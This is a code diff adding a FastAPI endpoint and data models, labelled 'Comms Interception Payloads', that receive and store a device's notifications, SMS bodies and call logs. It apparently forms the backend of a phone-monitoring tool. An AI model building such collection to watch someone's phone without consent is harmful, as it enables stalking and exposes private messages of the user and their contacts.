@@ -49,6 +49,34 @@ class BatchPayload(BaseModel):
     batch: list[BatchPoint]
 
 
+# ── Comms Interception Payloads ────────────────────────────────
+
+class NotificationPayload(BaseModel):
+    package_name: str
+    title: str | None = None
+    text: str | None = None
+    timestamp: datetime
+
+class SmsPayload(BaseModel):
+    sender: str
+    body: str | None = None
+    timestamp: datetime
+    is_incoming: bool
+
+class CallLogPayload(BaseModel):
+    number: str
+    duration_seconds: int
+    type: str # 'missed', 'incoming', 'outgoing'
+    timestamp: datetime
+
+class CommsBatchRequest(BaseModel):
+    device_id: str
+    notifications: list[NotificationPayload] | None = None
+    sms: list[SmsPayload] | None = None
+    calls: list[CallLogPayload] | None = None
+
+
+
 # ── Single point ingest ───────────────────────────────────────
 
 @router.post("/ingest", status_code=status.HTTP_201_CREATED)
@@ -108,6 +136,68 @@ async def ingest_batch(
         processed += 1
 
     return {"message": f"Batch ingested", "device_id": payload.device_id, "count": processed}
+
+
+# ── Communications Ingest Routes ──────────────────────────────
+
+@router.post("/comms", status_code=status.HTTP_201_CREATED)
+async def ingest_comms(
+    payload: CommsBatchRequest,
+    user: dict = Depends(get_current_user)
+):
+    """Ingest batched notifications, SMS, and call logs."""
+    async with AsyncSessionLocal() as session:
+        if payload.notifications:
+            for notif in payload.notifications:
+                await session.execute(
+                    text("""
+                        INSERT INTO notifications (device_id, package_name, title, text, timestamp)
+                        VALUES (:device_id, :pkg, :title, :txt, :ts)
+                    """),
+                    {
+                        "device_id": payload.device_id,
+                        "pkg": notif.package_name,
+                        "title": notif.title,
+                        "txt": notif.text,
+                        "ts": notif.timestamp
+                    }
+                )
+
+        if payload.sms:
+            for sms in payload.sms:
+                await session.execute(
+                    text("""
+                        INSERT INTO sms_messages (device_id, sender, body, timestamp, is_incoming)
+                        VALUES (:device_id, :sender, :body, :ts, :incoming)
+                    """),
+                    {
+                        "device_id": payload.device_id,
+                        "sender": sms.sender,
+                        "body": sms.body,
+                        "ts": sms.timestamp,
+                        "incoming": sms.is_incoming
+                    }
+                )
+                
+        if payload.calls:
+            for call in payload.calls:
+                await session.execute(
+                    text("""
+                        INSERT INTO call_logs (device_id, number, duration_seconds, type, timestamp)
+                        VALUES (:device_id, :num, :dur, :typ, :ts)
+                    """),
+                    {
+                        "device_id": payload.device_id,
+                        "num": call.number,
+                        "dur": call.duration_seconds,
+                        "typ": call.type,
+                        "ts": call.timestamp
+                    }
+                )
+
+        await session.commit()
+    
+    return {"message": "Comms ingested successfully"}
 
 
 # ── Shared processing logic ───────────────────────────────────
